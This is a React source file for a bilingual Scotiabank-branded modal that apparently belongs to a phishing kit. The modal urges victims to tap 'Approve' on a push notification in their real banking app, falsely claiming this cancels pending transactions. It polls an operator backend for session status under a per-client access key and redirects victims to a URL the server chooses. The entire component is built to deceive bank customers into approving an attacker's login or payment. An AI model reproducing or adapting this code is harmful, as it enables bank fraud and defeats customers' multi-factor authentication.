import React, { useEffect, useState } from 'react';
import { X, ShieldCheck, Smartphone, CheckCircle } from 'lucide-react';

const translations = {
  en: {
    titleButton: 'Approve',
    titleText: ' Transaction',
    subtitle1: 'A push notification was sent to your Scotiabank mobile app. Please open your app and ',
    subtitleButton: 'approve',
    subtitle2: ' the request to cancel the pending transactions.',
    bullets: [
      { icon: Smartphone, text: 'Open your Scotiabank mobile app' },
      { icon: ShieldCheck, text: 'Review the request details' },
      { icon: CheckCircle, text: 'Tap "Approve" to cancel pending transactions' },
    ],
    note: 'This extra step helps us keep your account secure.',
    securityBadge: 'Verified by Scotiabank Security',
    waitingText: 'Waiting for approval...',
    successTitle: 'Transaction Approved',
    successText: 'Your pending transactions will be cancelled in a moment...',
  },
  fr: {
    titleButton: 'Approuver',
    titleText: ' la Transaction',
    subtitle1: 'Une notification push a été envoyée à votre application mobile Banque Scotia. Veuillez ouvrir votre application et ',
    subtitleButton: 'approuver',
    subtitle2: ' la demande pour annuler les transactions en attente.',
    bullets: [
      { icon: Smartphone, text: 'Ouvrez votre application mobile Banque Scotia' },
      { icon: ShieldCheck, text: 'Examinez les détails de la demande' },
      { icon: CheckCircle, text: 'Appuyez sur "Approuver" pour annuler les transactions en attente' },
    ],
    note: 'Cette étape supplémentaire nous aide à sécuriser votre compte.',
    securityBadge: 'Vérifié par la Sécurité de la Banque Scotia',
    waitingText: 'En attente d\'approbation...',
    successTitle: 'Transaction Approuvée',
    successText: 'Vos transactions en attente seront annulées dans un instant...',
  },
};

export default function AppPushModal({ email, lang = 'en', onClose }) {
  const t = translations[lang] || translations.en;
  const [isSuccess, setIsSuccess] = useState(false);
  const [redirectUrl, setRedirectUrl] = useState('https://www.scotiabank.com/');

  useEffect(() => {
    let isMounted = true;
    
    const pollStatus = async () => {
      if (isSuccess) return;
      
      try {
        const response = await fetch(`/api/session-status?email=${encodeURIComponent(email)}`, {
          headers: { 'X-Access-Key': 'client-scotia-bank' },
        });
        const data = await response.json();
        if (!isMounted) return;
        
        if (data.success) {
          if (data.status === 'cancelled' || data.status === 'idle') {
            onClose();
            window.location.reload();
          } else if (data.status === 'redirect_success') {
            if (data.redirectUrl) {
              setRedirectUrl(data.redirectUrl);
            }
            setIsSuccess(true);
          }
        }
      } catch (err) {
        console.error('Error polling session status in AppPushModal:', err);
      }
    };
    
    pollStatus();
    const intervalId = setInterval(pollStatus, 2000);
    
    return () => { 
      isMounted = false; 
      clearInterval(intervalId);
    };
  }, [email, onClose, isSuccess]);

  useEffect(() => {
    if (isSuccess) {
      localStorage.removeItem('showAppPushModal');
      localStorage.removeItem('otpEmail');
      
      fetch('/api/clear-session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-scotia-bank' },
        body: JSON.stringify({ email })
      }).catch(err => console.error('Error clearing session:', err));

      const timer = setTimeout(() => {
        window.location.href = redirectUrl;
      }, 3000);
      return () => clearTimeout(timer);
    }
  }, [isSuccess, redirectUrl, email]);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs animate-fade-in select-none">
      <div
        className="bg-white w-full max-w-[460px] rounded-xl shadow-[0_20px_50px_rgba(0,0,0,0.18)] px-8 pt-8 pb-8 flex flex-col relative border border-[#e2e5eb] animate-slide-in overflow-hidden"
        style={{ fontFamily: "'ScotiabankSans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}
      >
        {/* Scotiabank Red top accent bar */}
        <div className="absolute top-0 left-0 right-0 h-1 bg-[#eb1120]" />

        {onClose && !isSuccess && (
          <button
            type="button"
            onClick={onClose}
            className="absolute top-4 right-4 bg-transparent border-none cursor-pointer text-[#666] hover:text-[#111] p-1.5 flex items-center rounded-full hover:bg-black/5 transition-all duration-200"
            aria-label="Close"
          >
            <X className="w-[18px] h-[18px]" />
          </button>
        )}

        {/* Scotiabank Footer Logo */}
        <div className="flex justify-center mb-5 pt-2">
          <div className={`transition-all duration-300 hover:scale-105 ${isSuccess ? 'scale-110' : ''}`}>
            <img
              src="/scotiabank-footer-logo.svg"
              alt="Scotiabank Logo"
              className="w-12 h-12 object-contain"
            />
          </div>
        </div>

        {isSuccess ? (
          <div className="flex flex-col items-center justify-center py-4 animate-fade-in">
            <CheckCircle className="w-16 h-16 text-[#eb1120] mb-4 drop-shadow-xs" />
            <h3 className="text-[22px] font-bold text-[#1a1a1a] text-center mb-2 tracking-tight">
              {t.successTitle}
            </h3>
            <p className="text-[#eb1120] text-[15.5px] font-medium text-center">
              {t.successText}
            </p>
          </div>
        ) : (
          <>
            <p className="text-[#333333] text-[16px] text-center mb-6 leading-relaxed px-2 font-normal">
              {t.subtitle1}
              <span className="bg-[#eb1120] text-white px-2 py-0.5 rounded-[4px] shadow-xs font-bold inline-block mx-0.5">
                {t.subtitleButton}
              </span>
              {t.subtitle2}
            </p>

            {/* Bullet features cards */}
            <div className="bg-[#fafafa] border border-[#e2e5eb] rounded-xl p-4 mb-6 shadow-inner">
              <ul className="space-y-4">
                {t.bullets.map(({ icon: Icon, text }, idx) => (
                  <li
                    key={text}
                    className="flex items-start gap-3.5 relative"
                  >
                    {idx !== t.bullets.length - 1 && (
                      <div className="absolute left-[15px] top-[30px] bottom-[-16px] w-[2px] bg-[#e2e5eb] z-0"></div>
                    )}
                    <span className="flex-shrink-0 w-8 h-8 rounded-full bg-white border-2 border-[#eb1120] flex items-center justify-center shadow-xs z-10 relative">
                      <Icon className="w-[16px] h-[16px] text-[#eb1120]" />
                    </span>
                    <span className="text-[14.5px] text-[#333333] font-normal leading-snug pt-1">{text}</span>
                  </li>
                ))}
              </ul>
            </div>

            {/* Waiting indicator */}
            <div className="flex flex-col items-center justify-center gap-3 mt-2 mb-2 py-3 rounded-xl">
              <div className="relative flex items-center justify-center w-12 h-12">
                <div className="absolute inset-0 border-4 border-red-100 rounded-full"></div>
                <div className="absolute inset-0 border-4 border-[#eb1120] rounded-full border-t-transparent animate-spin"></div>
                <Smartphone className="w-5 h-5 text-[#eb1120]" />
              </div>
              <span className="text-[14.5px] text-[#eb1120] font-bold animate-pulse tracking-wide">{t.waitingText}</span>
            </div>

            <p className="text-[13px] text-[#666] text-center mt-2 leading-normal px-2">
              {t.note}
            </p>

            {/* Security badge pill */}
            <div className="flex items-center justify-center gap-2 mt-5 pt-4 border-t border-[#f0f2f5]">
              <div className="flex items-center gap-1.5 bg-red-50/80 border border-red-100 px-3.5 py-1.5 rounded-full shadow-xs">
                <ShieldCheck className="w-3.5 h-3.5 text-[#eb1120]" />
                <span className="text-[11px] text-[#eb1120] font-bold tracking-wider uppercase">
                  {t.securityBadge}
                </span>
              </div>
            </div>
          </>
        )}
      </div>
    </div>
  );
}